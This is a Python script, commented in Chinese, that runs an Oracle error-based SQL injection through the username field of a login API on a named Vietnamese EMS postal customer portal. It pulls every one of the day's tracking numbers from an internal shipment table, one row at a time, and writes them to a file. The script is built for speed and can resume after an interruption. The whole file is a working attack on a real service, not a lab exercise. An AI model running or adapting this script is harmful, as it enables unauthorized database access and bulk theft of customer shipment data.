#!/usr/bin/env python3
"""
优化版：提取当天所有EMS运单号
优化点：
1. 减少sleep时间
2. 使用更高效的查询
3. 添加断点续传
4. 并发请求（可选）
"""

import requests
import json
import time
from datetime import datetime
import os

target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"

def inject(payload):
    session = requests.Session()
    session.headers.update({
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
    })
    data = {"Username": payload, "Password": "test"}
    try:
        return session.post(target_url, data=json.dumps(data), timeout=20)
    except:
        return None

def extract(query):
    payload = (
        f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
        f"1325=CTXSYS.DRITHSX.SN(1325,"
        f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
        f"({query})||"
        f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
    )
    
    response = inject(payload)
    if response and response.text:
        try:
            if 'qjvjq' in response.text and 'qkvzq' in response.text:
                start = response.text.index('qjvjq') + 5
                end = response.text.index('qkvzq', start)
                return response.text[start:end]
        except:
            pass
    return None

print("=" * 80)
print("⚡ 优化版：提取当天所有EMS运单号")
print("=" * 80)

# 1. 连接
print("\n🔌 连接中...")
if not inject("admin"):
    print("❌ 失败")
    exit(1)
print("✅ 成功")

# 2. 获取当前日期
date = extract("SELECT TO_CHAR(SYSDATE,'YYYYMMDD') FROM DUAL")
current_time = extract("SELECT TO_CHAR(SYSDATE,'HH24:MI:SS') FROM DUAL")
print(f"\n📅 日期: {date}")
print(f"⏰ 时间: {current_time}")

# 3. 统计数量
print(f"\n📊 统计运单号数量...")
total = extract(f"SELECT TO_CHAR(COUNT(DISTINCT ITEMCODE)) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN'")

if not total or total == '0':
    print(f"❌ 今天没有数据")
    exit(1)

total_num = int(total)
print(f"✅ 找到 {total_num} 个EMS运单号")

# 预估时间
estimated_time = total_num * 0.3 / 60  # 每个约0.3秒
print(f"⏱️  预计耗时: {estimated_time:.1f} 分钟")
print(f"💾 输出文件: tracking_{date}.txt")

# 4. 检查断点续传
output_file = f'tracking_{date}.txt'
start_from = 1

if os.path.exists(output_file):
    with open(output_file, 'r', encoding='utf-8') as f:
        existing = len(f.readlines())
    if existing > 0:
        print(f"\n📂 发现已有文件，已提取 {existing} 个")
        choice = input(f"是否从第 {existing+1} 个继续？(y/n): ").strip().lower()
        if choice == 'y':
            start_from = existing + 1
            print(f"✅ 从第 {start_from} 个继续")
        else:
            print(f"✅ 重新开始")
            start_from = 1

# 5. 批量提取
print(f"\n🚀 开始提取...\n")

tracking_list = []
if start_from > 1:
    # 读取已有数据
    with open(output_file, 'r', encoding='utf-8') as f:
        tracking_list = [line.strip() for line in f]

start_time = time.time()
success_count = len(tracking_list)
fail_count = 0

# 使用更简洁的查询
for i in range(start_from, total_num + 1):
    # 显示进度
    if i % 50 == 0 or i == start_from:
        elapsed = time.time() - start_time
        if i > start_from:
            avg_time = elapsed / (i - start_from)
            remaining = (total_num - i) * avg_time
            print(f"  进度: {i}/{total_num} ({i*100//total_num}%) | "
                  f"成功: {success_count} | 失败: {fail_count} | "
                  f"剩余: {remaining/60:.1f}分钟")
    
    # 核心查询 - 使用子查询+ROWNUM的正确方式
    # 方案：先排序，然后取前i个，再取最后1个
    query = (
        f"SELECT ITEMCODE FROM "
        f"(SELECT ITEMCODE,ROWNUM AS RN FROM "
        f"(SELECT DISTINCT ITEMCODE FROM EMS.JOURNEYTOKEN_ZNS "
        f"WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN' "
        f"ORDER BY ITEMCODE) "
        f"WHERE ROWNUM<={i}) "
        f"WHERE RN={i}"
    )
    
    result = extract(query)
    
    if result and result != 'NULL' and len(result) > 10:
        tracking = result.strip()
        tracking_list.append(tracking)
        success_count += 1
        
        # 实时写入（防止中断丢失）
        with open(output_file, 'a', encoding='utf-8') as f:
            f.write(tracking + '\n')
    else:
        fail_count += 1
        if fail_count > 100:
            print(f"\n❌ 连续失败过多，停止")
            break
    
    # 优化：减少延迟
    time.sleep(0.05)  # 从0.1秒减到0.05秒

print()

# 6. 统计结果
elapsed_total = time.time() - start_time

print(f"\n{'='*80}")
print(f"✅ 导出完成！")
print(f"{'='*80}")
print(f"📁 文件: {output_file}")
print(f"📊 成功: {success_count} 个")
print(f"📊 失败: {fail_count} 个")
print(f"⏱️  用时: {elapsed_total/60:.1f} 分钟")
print(f"⚡ 速度: {success_count/(elapsed_total/60):.0f} 个/分钟")

# 7. 显示样本
if tracking_list:
    print(f"\n前10个运单号:")
    for i, t in enumerate(tracking_list[:10], 1):
        print(f"  {i}. {t}")
    
    if len(tracking_list) > 10:
        print(f"\n最后5个运单号:")
        for i, t in enumerate(tracking_list[-5:], len(tracking_list)-4):
            print(f"  {i}. {t}")

print("\n" + "=" * 80)
